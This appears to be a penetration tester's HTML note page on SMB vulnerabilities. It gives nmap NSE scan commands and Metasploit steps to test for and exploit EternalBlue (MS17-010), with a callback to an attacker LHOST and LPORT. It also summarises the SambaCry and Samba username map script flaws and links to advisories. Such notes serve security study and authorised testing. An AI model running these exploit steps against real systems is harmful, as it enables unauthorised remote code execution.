<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Vulnerabilities </title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Vulnerabilities </h1><br/><br /><strong>Test with Nmap NSE</strong><br /><div class="codebox"><pre>nmap <span style="color:#ff9d00;font-weight:700">--</span>script<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#3ad900;font-weight:400">&quot;banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)&quot;</span> <span style="color:#ff9d00;font-weight:700">-</span>p <span style="color:#333333;font-weight:400">137</span>,<span style="color:#333333;font-weight:400">139</span>,<span style="color:#333333;font-weight:400">445</span> &lt;address&gt;</pre></div><br /><br />to test all SMB vulnerabilities(BETTER):<br />    <div class="codebox"><pre>nmap <span style="color:#ff9d00;font-weight:700">-</span>script<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#00117f;font-weight:400">smb-vuln</span><span style="color:#ff9d00;font-weight:700">*</span> <span style="color:#ff9d00;font-weight:700">-</span>p <span style="color:#333333;font-weight:400">137</span>,<span style="color:#333333;font-weight:400">139</span>,<span style="color:#333333;font-weight:400">445</span> &lt;address&gt; </pre></div><br /><br /><br /><br /><br /><br />• <strong>ETERNALBLUE (MS17-010) (CVE-2017-0143)</strong><br />   ◇ Test if host is vulnerable<br />       <div class="codebox"><pre>msfconsole<br />use auxiliary<span style="color:#ff9d00;font-weight:700">/</span>scanner<span style="color:#ff9d00;font-weight:700">/</span>smb<span style="color:#ff9d00;font-weight:700">/</span>smb_ms17_010<br /><span style="color:#ff9d00;font-weight:700">set</span> rhosts [ip_target]</pre></div><br />        <a href=""><img src="images/1440-1.png" alt="images/1440-1.png" /></a><br />   ◇ Exploit<br />       <div class="codebox"><pre>use exploit<span style="color:#ff9d00;font-weight:700">/</span>windows<span style="color:#ff9d00;font-weight:700">/</span>smb<span style="color:#ff9d00;font-weight:700">/</span>ms17_010_psexec<br /><span style="color:#ff9d00;font-weight:700">set</span> RHOSTS [ip_target]<br /><span style="color:#ff9d00;font-weight:700">set</span> LHOST  [ip_attacker_interface]<br /><span style="color:#ff9d00;font-weight:700">set</span> LPORT [port]<br />exploit</pre></div><br />      <a href=""><img src="images/1440-2.png" alt="images/1440-2.png" /></a><br /><br /><br /><br /><br />• <a href="http://cve.circl.lu/cve/CVE-2017-7494">CVE-2017-7494</a> (referred also as <span style="text-decoration:underline;">SambaCry</span>)<br />    Samba since version 3.5.0 and before 4.6.4, 4.5.10 and 4.4.14 is vulnerable to remote code execution vulnerability, allowing a malicious client to upload a shared library to a writable share, and then cause the server to load and execute it.<br />• <a href="http://cve.circl.lu/cve/CVE-2007-2447">CVE-2007-2447</a> (referred as <span style="text-decoration:underline;">Username Map Script</span>)<br />    Samba since version 3.0.20 and before 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the &quot;username map script&quot; smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.<br />   ◇ <span style="text-decoration:underline;">Samba.org explanation of the vulnerability</span>: <a href="https://www.samba.org/samba/security/CVE-2007-2447.html">https://www.samba.org/samba/security/CVE-2007-2447.html</a><br />   ◇ <span style="text-decoration:underline;">Metasploit module</span>: <a href="https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_scrip">https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_scrip</a><br /><br /><br /></div>
</body>
</html>
